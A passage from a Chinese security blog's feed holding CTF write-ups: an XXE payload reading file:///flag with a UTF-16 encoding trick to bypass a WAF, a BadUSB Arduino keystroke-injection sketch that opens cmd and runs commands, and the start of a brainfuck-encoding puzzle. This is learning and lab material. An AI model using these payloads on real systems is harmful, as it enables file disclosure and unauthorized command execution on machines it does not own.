class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>Alice<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>email</span><span class="token punctuation">></span></span>alice@fakesite.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>email</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>做成一个xml文件就行了，上传一下，有WAF，不知道过滤了啥。wp上说要换一下编码方式，用命令:<br><pre class="line-numbers language-none"><code class="language-none">iconv -f utf-8 -t utf-16 1.xml&gt;2.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h2 id="得flag"><a href="#得flag" class="headerlink" title="得flag"></a>得flag</h2><p><del>上面的内容转utf16后还是不行，只能用他给出的</del><br><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version='1.0'?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">users</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "file:///flag" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>bob<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>passwd2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span> Bob<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>email</span><span class="token punctuation">></span></span>bob@fakesite.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>email</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span>CSAW2019<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intro</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>intro</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>我的锅，要用linux的vim（windows上好像也有，但是下面的命令还得在linux上面执行，索性就用linux的vim）编写代码然后再使用上面的编码命令才不会报错，然后就能直接上传得flag了。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> xxe之waf绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>badusb之Arduino语法</title>
      <link href="2020/09/29/badusb%E4%B9%8BArduino%E8%AF%AD%E6%B3%95/"/>
      <url>2020/09/29/badusb%E4%B9%8BArduino%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="BadUsb简单用法示例"><a href="#BadUsb简单用法示例" class="headerlink" title="BadUsb简单用法示例"></a>BadUsb简单用法示例</h1><h2 id="所需硬件"><a href="#所需硬件" class="headerlink" title="所需硬件"></a>所需硬件</h2><p>badusb 自行淘宝  驱动程序会自动安装，若未自动安装自行百度</p><h2 id="所需工具"><a href="#所需工具" class="headerlink" title="所需工具"></a>所需工具</h2><p>arduino-1.5.5-r2用于编辑代码并上传至badusb<br>badusb连接至电脑</p><pre class="line-numbers language-none"><code class="language-none">打开arduino-1.5.5-r2-&gt;打开工具菜单-&gt;板-&gt;Arduino Leonardo                                   打开工具菜单-&gt;端口-&gt;选择相应的com口   &#x2F;&#x2F;这一步极为重要<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>左上角第二个向右的箭头图标为上传按钮，编辑好代码后上传至优盘即可。</p><h2 id="语法示例"><a href="#语法示例" class="headerlink" title="语法示例:"></a>语法示例:</h2><pre class="line-numbers language-none"><code class="language-none">void setup() &#123;  &#x2F;&#x2F; put your setup code here, to run once:Keyboard.begin();&#x2F;&#x2F;开始键盘通讯delay(3000);&#x2F;&#x2F;延时Keyboard.press(KEY_LEFT_GUI);&#x2F;&#x2F;win键delay(50);Keyboard.press(&#39;r&#39;);&#x2F;&#x2F;r键delay(50);Keyboard.release(KEY_LEFT_GUI);Keyboard.release(&#39;r&#39;);delay(1000);Keyboard.println(&quot;cmd &quot;); &#x2F;&#x2F;注意这里命令的最后多了一个空格 如果目标终端的输入法是中文的话这个空格非常关键delay(500);Keyboard.println(&quot;ping  211.140.13.188 -t &quot;); ; &#x2F;&#x2F;注意最后有一个空格delay(1000);&#x2F;&#x2F;延时Keyboard.press(KEY_LEFT_GUI);&#x2F;&#x2F;win键delay(50);Keyboard.press(&#39;r&#39;);&#x2F;&#x2F;r键delay(50);Keyboard.release(KEY_LEFT_GUI);Keyboard.release(&#39;r&#39;);delay(1000);Keyboard.println(&quot;cmd &quot;); &#x2F;&#x2F;注意最后有一个空格delay(500);Keyboard.println(&quot;start http:&#x2F;&#x2F;weibo.com&#x2F;enderzhou &quot;); &#x2F;&#x2F;注意最后有一个空格&#125; void loop() &#123;  &#x2F;&#x2F; put your main code here, to run repeatedly: &#125;  具体按键设置delay(5000);&#x2F;&#x2F;延时毫秒 Keyboard.begin();     &#x2F;&#x2F;开始键盘通讯Keyboard.end();     &#x2F;&#x2F;结束键盘通讯Keyboard.press();     &#x2F;&#x2F;按下键盘按键     如果是非特殊按键如 数字、字母按键用单引号括起来Keyboard.release();     &#x2F;&#x2F;释放键盘按键Keyboard.println(&quot;&quot;);     &#x2F;&#x2F;输入字符串使用双引号括起来  Mouse.begin();&#x2F;&#x2F;鼠标事件开始Mouse.click();&#x2F;&#x2F;鼠标单击Mouse.end();&#x2F;&#x2F;鼠标事件结束Mouse.move();&#x2F;&#x2F;鼠标移动(x,y)Mouse.press();&#x2F;&#x2F;鼠标按下Mouse.release();&#x2F;&#x2F;鼠标松开Mouse.isPressed();&#x2F;&#x2F;   KEY_LEFT_CTRLKEY_LEFT_SHIFTKEY_LEFT_ALTKEY_LEFT_GUI    &#x2F;&#x2F;win键KEY_RIGHT_CTRLKEY_RIGHT_SHIFTKEY_RIGHT_ALTKEY_RIGHT_GUIKEY_UP_ARROWKEY_DOWN_ARROWKEY_LEFT_ARROWKEY_RIGHT_ARROWKEY_BACKSPACEKEY_TABKEY_RETURN&#x2F;&#x2F;回车键KEY_ESCKEY_INSERTKEY_DELETEKEY_PAGE_UPKEY_PAGE_DOWNKEY_HOMEKEY_ENDKEY_CAPS_LOCKKEY_F1KEY_F2KEY_F3KEY_F4KEY_F5KEY_F6KEY_F7KEY_F8KEY_F9KEY_F10KEY_F11KEY_F12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> badusb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神秘龙卷风</title>
      <link href="2020/09/28/%E7%A5%9E%E7%A7%98%E9%BE%99%E5%8D%B7%E9%A3%8E/"/>
      <url>2020/09/28/%E7%A5%9E%E7%A7%98%E9%BE%99%E5%8D%B7%E9%A3%8E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h1><h2 id="第一步rar密码"><a href="#第一步rar密码" class="headerlink" title="第一步rar密码"></a>第一步rar密码</h2><pre class="line-numbers language-password" data-language="password"><code class="language-password">5463<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-brainfuck" data-language="brainfuck"><code class="language-brainfuck">                  <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                       <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                            <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                   <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                         <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                            <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                              <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                               <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                                <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                                 <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                                  <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                                  <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                                  <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                                  <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                                 <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                               <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span>                                             <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                           <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                        <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                      <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span>                                    <span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment 